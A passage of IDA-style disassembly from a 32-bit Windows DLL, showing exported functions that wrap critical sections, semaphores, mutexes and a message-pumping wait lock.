		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+0Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		dec	dword ptr [esi+14h]
		jnz	short loc_6AF4C609
		lea	ecx, [esi+4]
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		test	eax, eax
		jnz	short loc_6AF4C609
		inc	dword ptr [esi+14h]
		xor	esi, esi
		jmp	short loc_6AF4C60C
; ---------------------------------------------------------------------------

loc_6AF4C609:				; CODE XREF: Ordinal1246+1Cj
					; Ordinal1246+28j
		xor	esi, esi
		inc	esi

loc_6AF4C60C:				; CODE XREF: Ordinal1246+2Fj
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_C], offset off_6AF5F480
		call	Ordinal1232
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal1246	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C620(void *, char)
sub_6AF4C620	proc near		; DATA XREF: .rdata:off_6AF5F4ACo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1250
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C636
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C636:				; CODE XREF: sub_6AF4C620+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C620	endp

; Exported entry 1255.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1255
Ordinal1255	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		push	esi
		push	[esp+4+arg_8]
		mov	esi, ecx
		push	[esp+8+arg_4]
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5F4C0
		mov	[esi+4], eax
		call	Ordinal1231
		mov	eax, esi
		pop	esi
		retn	0Ch
Ordinal1255	endp

; Exported entry 1257.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1257
Ordinal1257	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5F4C0
		jmp	Ordinal1232
Ordinal1257	endp

; Exported entry 1261.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1261
Ordinal1261	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		push	esi
		push	[esp+4+arg_8]
		mov	esi, ecx
		push	[esp+8+arg_4]
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5F4C4
		mov	[esi+4], eax
		call	Ordinal1264
		mov	eax, esi
		pop	esi
		retn	0Ch
Ordinal1261	endp

; Exported entry 1263.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1263
Ordinal1263	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5F4C4
		jmp	Ordinal1265
Ordinal1263	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_9. PRESS KEYPAD "+" TO EXPAND]
; Exported entry 1272.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1272(DWORD nCount, HANDLE *pHandles, int, int, int)
		public Ordinal1272
Ordinal1272	proc near		; CODE XREF: Ordinal1269+11j
					; Ordinal1270+45p ...

Msg		= tagMSG ptr -30h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
dwMilliseconds	= dword	ptr -8
var_4		= dword	ptr -4
nCount		= dword	ptr  8
pHandles	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_C], ecx
		call	ds:GetTickCount
		mov	esi, ds:PeekMessageA
		mov	[ebp+var_14], eax
		mov	eax, [ebp+arg_C]
		xor	edi, edi
		mov	[ebp+dwMilliseconds], eax
		mov	[ebp+var_4], edi

loc_6AF4C6E3:				; CODE XREF: Ordinal1272+110j
		mov	ecx, [ebp+var_C]
		lea	eax, [ebp+dwMilliseconds]
		push	eax
		push	[ebp+arg_C]
		push	[ebp+var_14]
		call	Ordinal1274
		test	eax, eax
		jz	loc_6AF4C7D5
		mov	ecx, [ebp+arg_10]
		xor	eax, eax
		cmp	[ebp+arg_8], edi
		setnz	al
		neg	ecx
		sbb	ecx, ecx
		and	ecx, 2
		or	eax, ecx
		push	eax		; dwFlags
		push	4FFh		; dwWakeMask
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		push	[ebp+pHandles]	; pHandles
		push	[ebp+nCount]	; nCount
		call	ds:MsgWaitForMultipleObjectsEx
		cmp	eax, [ebp+nCount]
		mov	[ebp+var_10], eax
		jnz	loc_6AF4C7DC
		push	1		; wRemoveMsg
		push	edi		; wMsgFilterMax
		push	edi		; wMsgFilterMin
		push	edi		; hWnd
		lea	eax, [ebp+Msg]
		push	eax		; lpMsg
		xor	ebx, ebx
		call	esi ; PeekMessageA
		test	eax, eax
		jz	short loc_6AF4C7BA

loc_6AF4C743:				; CODE XREF: Ordinal1272+DCj
		cmp	[ebp+Msg.message], 12h
		jnz	short loc_6AF4C75C
		mov	eax, [ebp+var_C]
		cmp	[eax+8], edi
		jnz	short loc_6AF4C79D
		push	offset aCmessagelockLo ; "CMessageLock::LockWithMessagePump() :	m"...
		call	sub_6AF31006
		pop	ecx

loc_6AF4C75C:				; CODE XREF: Ordinal1272+8Aj
		lea	eax, [ebp+Msg]
		push	eax		; lpMsg
		call	ds:TranslateMessage
		lea	eax, [ebp+Msg]
		push	eax		; lpMsg
		call	ds:DispatchMessageA
		mov	ecx, [ebp+var_C]
		lea	eax, [ebp+dwMilliseconds]
		push	eax
		push	[ebp+arg_C]
		push	[ebp+var_14]
		call	Ordinal1274
		test	eax, eax
		jz	short loc_6AF4C7A8
		cmp	ebx, 20h
		jg	short loc_6AF4C7B6
		push	1		; wRemoveMsg
		push	edi		; wMsgFilterMax
		push	edi		; wMsgFilterMin
		push	edi		; hWnd
		lea	eax, [ebp+Msg]
		push	eax		; lpMsg
		inc	ebx
		call	esi ; PeekMessageA
		test	eax, eax
		jnz	short loc_6AF4C743
		jmp	short loc_6AF4C7B6
; ---------------------------------------------------------------------------

loc_6AF4C79D:				; CODE XREF: Ordinal1272+92j
		push	[ebp+Msg.wParam] ; nExitCode
		call	ds:PostQuitMessage
		jmp	short loc_6AF4C7AF
; ---------------------------------------------------------------------------

loc_6AF4C7A8:				; CODE XREF: Ordinal1272+C7j
		mov	[ebp+var_10], 102h

loc_6AF4C7AF:				; CODE XREF: Ordinal1272+E9j
		mov	[ebp+var_4], 1

loc_6AF4C7B6:				; CODE XREF: Ordinal1272+CCj
					; Ordinal1272+DEj
		cmp	ebx, edi
		jnz	short loc_6AF4C7CA

loc_6AF4C7BA:				; CODE XREF: Ordinal1272+84j
		cmp	[ebp+var_4], edi
		jnz	short loc_6AF4C7DC
		push	offset aCmessagelock_0 ; "CMessageLock::LockWithMessagePump() :	n"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF4C7CA:				; CODE XREF: Ordinal1272+FBj
		cmp	[ebp+var_4], edi
		jz	loc_6AF4C6E3
		jmp	short loc_6AF4C7DC
; ---------------------------------------------------------------------------

loc_6AF4C7D5:				; CODE XREF: Ordinal1272+3Aj
		mov	[ebp+var_10], 102h

loc_6AF4C7DC:				; CODE XREF: Ordinal1272+6Fj
					; Ordinal1272+100j ...
		mov	eax, [ebp+var_10]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	14h
Ordinal1272	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C7E6(void *, char)
sub_6AF4C7E6	proc near		; DATA XREF: .rdata:off_6AF5F480o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F480
		call	Ordinal1232
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C802
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C802:				; CODE XREF: sub_6AF4C7E6+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C7E6	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C808(void *, char)
sub_6AF4C808	proc near		; DATA XREF: .rdata:off_6AF5F4CCo

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F4CC
		call	Ordinal1239
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C824
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C824:				; CODE XREF: sub_6AF4C808+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C808	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C82A(void *, char)
sub_6AF4C82A	proc near		; DATA XREF: .rdata:off_6AF5F4C0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F4C0
		call	Ordinal1232
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C846
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C846:				; CODE XREF: sub_6AF4C82A+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C82A	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C84C(void *, char)
sub_6AF4C84C	proc near		; DATA XREF: .rdata:off_6AF5F4C4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5F4C4
		call	Ordinal1265
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C868
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C868:				; CODE XREF: sub_6AF4C84C+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C84C	endp

; Exported entry 1269.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1269
Ordinal1269	proc near		; CODE XREF: Ordinal499+4Ap
					; Ordinal1373+56p ...
		push	ebp
		mov	ebp, esp
		cmp	dword ptr [ecx+4], 0
		jnz	short loc_6AF4C87E
		pop	ebp
		jmp	ds:WaitForMultipleObjectsEx
; ---------------------------------------------------------------------------

loc_6AF4C87E:				; CODE XREF: Ordinal1269+7j
		pop	ebp
		jmp	Ordinal1272
Ordinal1269	endp

; Exported entry 1270.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1270(HANDLE pHandles, DWORD dwMilliseconds, BOOL	bAlertable)
		public Ordinal1270
Ordinal1270	proc near		; DATA XREF: .rdata:off_6AF66098o

pHandles	= dword	ptr  8
dwMilliseconds	= dword	ptr  0Ch
bAlertable	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ecx+4]
		xor	edx, edx
		cmp	eax, edx
		jnz	short loc_6AF4C8BC
		cmp	[ebp+bAlertable], edx
		jnz	short loc_6AF4C8A3
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		push	[ebp+pHandles]	; hHandle
		call	ds:WaitForSingleObject
		jmp	short loc_6AF4C8CE
; ---------------------------------------------------------------------------

loc_6AF4C8A3:				; CODE XREF: Ordinal1270+Fj
		cmp	eax, edx
		jnz	short loc_6AF4C8BC
		push	[ebp+bAlertable] ; bAlertable
		lea	eax, [ebp+pHandles]
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		push	edx		; bWaitAll
		push	eax		; lpHandles
		push	1		; nCount
		call	ds:WaitForMultipleObjectsEx
		jmp	short loc_6AF4C8CE
; ---------------------------------------------------------------------------

loc_6AF4C8BC:				; CODE XREF: Ordinal1270+Aj
					; Ordinal1270+21j
		push	[ebp+bAlertable] ; int
		lea	eax, [ebp+pHandles]
		push	[ebp+dwMilliseconds] ; int
		push	edx		; int
		push	eax		; pHandles
		push	1		; nCount
		call	Ordinal1272

loc_6AF4C8CE:				; CODE XREF: Ordinal1270+1Dj
					; Ordinal1270+36j
		pop	ebp
		retn	0Ch
Ordinal1270	endp

; Exported entry 1271.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1271(HANDLE pHandles, DWORD dwMilliseconds)
		public Ordinal1271
Ordinal1271	proc near		; CODE XREF: Ordinal1299+34p
					; Ordinal1310+34p ...

pHandles	= dword	ptr  4
dwMilliseconds	= dword	ptr  8

		xor	eax, eax
		cmp	[ecx+4], eax
		jnz	short loc_6AF4C8E9
		push	[esp+dwMilliseconds] ; dwMilliseconds
		push	[esp+4+pHandles] ; hHandle
		call	ds:WaitForSingleObject
		jmp	short locret_6AF4C8FB
; ---------------------------------------------------------------------------

loc_6AF4C8E9:				; CODE XREF: Ordinal1271+5j
		push	eax		; int
		push	[esp+4+dwMilliseconds] ; int
		push	eax		; int
		lea	eax, [esp+0Ch+pHandles]
		push	eax		; pHandles
		push	1		; nCount
		call	Ordinal1272

locret_6AF4C8FB:			; CODE XREF: Ordinal1271+15j
		retn	8
Ordinal1271	endp

; Exported entry 1238.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1238(DWORD dwMilliseconds, BOOL bWaitAll, int)
		public Ordinal1238
Ordinal1238	proc near		; CODE XREF: Ordinal1234+22p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
dwMilliseconds	= dword	ptr  8
bWaitAll	= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		mov	edx, [ebp+arg_8]
		and	[ebp+var_4], 0
		test	edx, edx
		push	esi
		push	0		; bAlertable
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		mov	esi, ecx
		push	[ebp+bWaitAll]	; bWaitAll
		mov	ecx, [esi+8]
		lea	eax, [esi+0Ch]
		push	eax		; lpHandles
		mov	[ebp+var_C], offset off_6AF5F4C8
		mov	[ebp+var_8], edx
		push	ecx		; nCount
		jnz	short loc_6AF4C934
		call	ds:WaitForMultipleObjectsEx
		jmp	short loc_6AF4C93C
; ---------------------------------------------------------------------------

loc_6AF4C934:				; CODE XREF: Ordinal1238+2Cj
		lea	ecx, [ebp+var_C]
		call	Ordinal1272

loc_6AF4C93C:				; CODE XREF: Ordinal1238+34j
		mov	ecx, [esi+8]
		cmp	eax, ecx
		jnb	short loc_6AF4C971
		cmp	[ebp+bWaitAll],	0
		jz	short loc_6AF4C966
		xor	edx, edx
		test	ecx, ecx
		jbe	short loc_6AF4C971
		lea	ecx, [esi+10Ch]

loc_6AF4C955:				; CODE XREF: Ordinal1238+64j
		mov	dword ptr [ecx], 1
		inc	edx
		add	ecx, 4
		cmp	edx, [esi+8]
		jb	short loc_6AF4C955
		jmp	short loc_6AF4C971
; ---------------------------------------------------------------------------

loc_6AF4C966:				; CODE XREF: Ordinal1238+49j
		mov	dword ptr [esi+eax*4+10Ch], 1

loc_6AF4C971:				; CODE XREF: Ordinal1238+43j
					; Ordinal1238+4Fj ...
		pop	esi
		leave
		retn	0Ch
Ordinal1238	endp

; Exported entry 1234.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1234(int, int, DWORD dwMilliseconds, BOOL bWaitAll, int)
		public Ordinal1234
Ordinal1234	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
dwMilliseconds	= dword	ptr  10h
bWaitAll	= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_4]
		mov	esi, ecx
		push	[ebp+arg_0]
		mov	dword ptr [esi], offset	off_6AF5F4CC
		call	Ordinal1237
		push	[ebp+arg_10]	; int
		mov	ecx, esi
		push	[ebp+bWaitAll]	; bWaitAll
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		call	Ordinal1238
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
Ordinal1234	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF4C9A4	proc near		; CODE XREF: Ordinal1277:loc_6AF4CA38p

var_108		= byte ptr -108h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 108h
		cmp	dword_6AF68270,	0
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		jz	short loc_6AF4C9C5
		mov	eax, dword_6AF6826C
		jmp	short loc_6AF4C9FB
; ---------------------------------------------------------------------------

loc_6AF4C9C5:				; CODE XREF: sub_6AF4C9A4+18j
		push	esi
		lea	ecx, [ebp+var_108]
		call	Ordinal932
		lea	ecx, [ebp+var_108]
		call	Ordinal947
		lea	ecx, [ebp+var_108]
		mov	dword_6AF6826C,	eax
		mov	dword_6AF68270,	1
		mov	esi, eax
		call	Ordinal933
		mov	eax, esi
		pop	esi

loc_6AF4C9FB:				; CODE XREF: sub_6AF4C9A4+1Fj
		mov	ecx, [ebp+var_4]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		leave
		retn
sub_6AF4C9A4	endp

; Exported entry 1275.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1275
Ordinal1275	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF5F570
		retn
Ordinal1275	endp

; Exported entry 1276.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1276
Ordinal1276	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5F570
		retn
Ordinal1276	endp

; Exported entry 1277.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1277(LPCSTR lpString2, LPSTR lpString1, int)
		public Ordinal1277
Ordinal1277	proc near		; CODE XREF: Ordinal1294+2Fp
					; Ordinal1295+30p ...

lpString2	= dword	ptr  8
lpString1	= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	[ebp+lpString2]	; lpString
		call	ds:lstrlenA
		add	eax, 8
		cmp	eax, [ebp+arg_8]
		jbe	short loc_6AF4CA38
		push	offset aCsyncobjectCre ; "CSyncObject::CreateGlobalName() : lstrl"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_6AF4CA38:				; CODE XREF: Ordinal1277+12j
		call	sub_6AF4C9A4
		test	eax, eax
		jz	short loc_6AF4CA5D
		push	offset aGlobal	; "Global\\"
		push	[ebp+lpString1]	; lpString1
		call	ds:lstrcpyA
		push	[ebp+lpString2]	; lpString2
		push	[ebp+lpString1]	; lpString1
		call	ds:lstrcatA
		jmp	short loc_6AF4CA69
; ---------------------------------------------------------------------------

loc_6AF4CA5D:				; CODE XREF: Ordinal1277+2Aj
		push	[ebp+lpString2]	; lpString2
		push	[ebp+lpString1]	; lpString1
		call	ds:lstrcpyA

loc_6AF4CA69:				; CODE XREF: Ordinal1277+46j
		xor	eax, eax
		inc	eax
		pop	ebp
		retn
Ordinal1277	endp

; Exported entry 1280.
; Exported entry 1526.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1526
Ordinal1526	proc near		; DATA XREF: .rdata:off_6AF66098o
		lea	eax, [ecx+4]	; ccL30_1280
		retn
Ordinal1526	endp

; Exported entry 1281.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1281
Ordinal1281	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	esi
		push	edi
		push	6
		lea	esi, [ecx+4]
		pop	ecx
		mov	edi, eax
		rep movsd
		pop	edi
		pop	esi
		retn	4
Ordinal1281	endp

; Exported entry 1283.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1283
Ordinal1283	proc near		; CODE XREF: Ordinal1279+9p
					; Ordinal1282+11p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+1Ch], 0
		jz	short loc_6AF4CA9E
		lea	eax, [esi+4]
		push	eax		; lpCriticalSection
		call	ds:DeleteCriticalSection
		and	dword ptr [esi+1Ch], 0

loc_6AF4CA9E:				; CODE XREF: Ordinal1283+7j
		pop	esi
		retn
Ordinal1283	endp

; Exported entry 1284.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1284
Ordinal1284	proc near		; CODE XREF: Ordinal1287p
					; DATA XREF: .rdata:off_6AF66098o

Args		= byte ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h

		push	0Ch
		push	offset stru_6AF5F638
		call	__SEH_prolog
		cmp	dword ptr [ecx+1Ch], 0
		jnz	short loc_6AF4CABF
		push	offset aCcriticalsecti ; "CCriticalSection::Lock() : m_bCreated	="...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4CAFA
; ---------------------------------------------------------------------------

loc_6AF4CABF:				; CODE XREF: Ordinal1284+10j
		and	[ebp+ms_exc.disabled], 0
		add	ecx, 4
		push	ecx		; lpCriticalSection
		call	ds:EnterCriticalSection
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4CAFC
; ---------------------------------------------------------------------------

loc_6AF4CAD6:				; DATA XREF: .rdata:stru_6AF5F638o
		mov	eax, [ebp+ms_exc.exc_ptr] ; Exception filter 0 for function 6AF4CAA0
		mov	eax, [eax]
		mov	eax, [eax]
		mov	dword ptr [ebp+Args], eax
		xor	eax, eax
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CAE4:				; DATA XREF: .rdata:stru_6AF5F638o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 6AF4CAA0
		push	dword ptr [ebp+Args] ; Args
		push	offset aCcriticalsec_2 ; "CCriticalSection::Lock() : __except(), "...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh

loc_6AF4CAFA:				; CODE XREF: Ordinal1284+1Dj
		xor	eax, eax

loc_6AF4CAFC:				; CODE XREF: Ordinal1284+34j
		call	__SEH_epilog
		retn
Ordinal1284	endp

; Exported entry 1285.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1285
Ordinal1285	proc near		; DATA XREF: .rdata:off_6AF66098o
		cmp	dword ptr [ecx+1Ch], 0
		jnz	short loc_6AF4CB16
		push	offset aCcriticalsec_0 ; "CCriticalSection::TryLock() :	m_bCreate"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CB16:				; CODE XREF: Ordinal1285+4j
		add	ecx, 4
		push	ecx		; lpCriticalSection
		call	ds:TryEnterCriticalSection
		retn
Ordinal1285	endp

; Exported entry 654.
; Exported entry 1173.
; Exported entry 1286.
; Exported entry 1390.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1173
Ordinal1173	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+1Ch]	; ccL30_654
					; ccL30_1173
					; ccL30_1286
		retn
Ordinal1173	endp

; Exported entry 1287.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1287
Ordinal1287	proc near		; DATA XREF: .rdata:6AF5F804o
					; .rdata:off_6AF66098o
		call	Ordinal1284
		retn	8
Ordinal1287	endp

; Exported entry 1288.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1288
Ordinal1288	proc near		; DATA XREF: .rdata:6AF5F808o
					; .rdata:off_6AF66098o
		cmp	dword ptr [ecx+1Ch], 0
		jnz	short loc_6AF4CB41
		push	offset aCcriticalsec_1 ; "CCriticalSection::UnLock() : m_bCreated"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF4CB41:				; CODE XREF: Ordinal1288+4j
		add	ecx, 4
		push	ecx		; lpCriticalSection
		call	ds:LeaveCriticalSection
		xor	eax, eax
		inc	eax
		retn
Ordinal1288	endp

; Exported entry 1290.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1290
Ordinal1290	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		mov	dword ptr [eax], offset	off_6AF5F6AC
		retn
Ordinal1290	endp

; Exported entry 1296.
; Exported entry 1308.
; Exported entry 1319.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1296
Ordinal1296	proc near		; CODE XREF: Ordinal1292+9p
					; Ordinal1294+14p ...
		push	esi		; ccL30_1296
					; ccL30_1308
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4CB71
		push	eax		; hObject
		call	ds:CloseHandle
		and	dword ptr [esi+4], 0

loc_6AF4CB71:				; CODE XREF: Ordinal1296+8j
		pop	esi
		retn
Ordinal1296	endp

; Exported entry 1297.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal1297(LONG lReleaseCount,	LPLONG lpPreviousCount)
		public Ordinal1297
Ordinal1297	proc near		; CODE XREF: Ordinal1300+4p
					; DATA XREF: .rdata:off_6AF66098o

lReleaseCount	= dword	ptr  4
lpPreviousCount	= dword	ptr  8

		mov	eax, [ecx+4]
		test	eax, eax
		jnz	short loc_6AF4CB89
		push	offset aCsemaphoreUnlo ; "CSemaphore::Unlock() : m_hSemaphore == "...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF4CB9E
; ---------------------------------------------------------------------------

loc_6AF4CB89:				; CODE XREF: Ordinal1297+5j
		push	[esp+lpPreviousCount] ;	lpPreviousCount
		push	[esp+4+lReleaseCount] ;	lReleaseCount
		push	eax		; hSemaphore
		call	ds:ReleaseSemaphore
		neg	eax
		sbb	eax, eax
		neg	eax

locret_6AF4CB9E:			; CODE XREF: Ordinal1297+14j
		retn	8
Ordinal1297	endp

; Exported entry 1299.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1299(DWORD dwMilliseconds, int)
		public Ordinal1299
Ordinal1299	proc near		; DATA XREF: .rdata:6AF5F6B0o
					; .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
dwMilliseconds	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+4], 0
		jnz	short loc_6AF4CBBF
		push	offset aCsemaphoreLock ; "CSemaphore::Lock() : m_hSemaphore == NU"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4CBEB
; ---------------------------------------------------------------------------

loc_6AF4CBBF:				; CODE XREF: Ordinal1299+Dj
		push	0
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_C]
		call	Ordinal1267
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		lea	ecx, [ebp+var_C]
		push	dword ptr [esi+4] ; pHandles
		call	Ordinal1271
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_C]
		inc	esi
		call	Ordinal1268
		mov	eax, esi

loc_6AF4CBEB:				; CODE XREF: Ordinal1299+1Cj
		pop	esi
		leave
		retn	8
Ordinal1299	endp

; Exported entry 1300.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1300
Ordinal1300	proc near		; DATA XREF: .rdata:6AF5F6B4o
					; .rdata:off_6AF66098o
		push	0		; lpPreviousCount
		push	1		; lReleaseCount
		call	Ordinal1297
		retn
Ordinal1300	endp

; Exported entry 1302.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1302
Ordinal1302	proc near		; CODE XREF: Ordinal1072+34p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		mov	dword ptr [eax], offset	off_6AF5F718
		retn
Ordinal1302	endp

; Exported entry 1310.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1310(DWORD dwMilliseconds, int)
		public Ordinal1310
Ordinal1310	proc near		; DATA XREF: .rdata:6AF5F71Co
					; .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
dwMilliseconds	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+4], 0
		jnz	short loc_6AF4CC25
		push	offset aCmutexLockM_hm ; "CMutex::Lock() : m_hMutex == NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF4CC5C
; ---------------------------------------------------------------------------

loc_6AF4CC25:				; CODE XREF: Ordinal1310+Dj
		push	0
		push	[ebp+arg_4]
		lea	ecx, [ebp+var_C]
		call	Ordinal1267
		push	[ebp+dwMilliseconds] ; dwMilliseconds
		lea	ecx, [ebp+var_C]
		push	dword ptr [esi+4] ; pHandles
		call	Ordinal1271
		test	eax, eax
		jz	short loc_6AF4CC4F
		cmp	eax, 80h
		jz	short loc_6AF4CC4F
		xor	esi, esi
		jmp	short loc_6AF4CC52
; ---------------------------------------------------------------------------

loc_6AF4CC4F:				; CODE XREF: Ordinal1310+3Bj
					; Ordinal1310+42j
		xor	esi, esi
		inc	esi

loc_6AF4CC52:				; CODE XREF: Ordinal1310+46j
		lea	ecx, [ebp+var_C]
		call	Ordinal1268
		mov	eax, esi

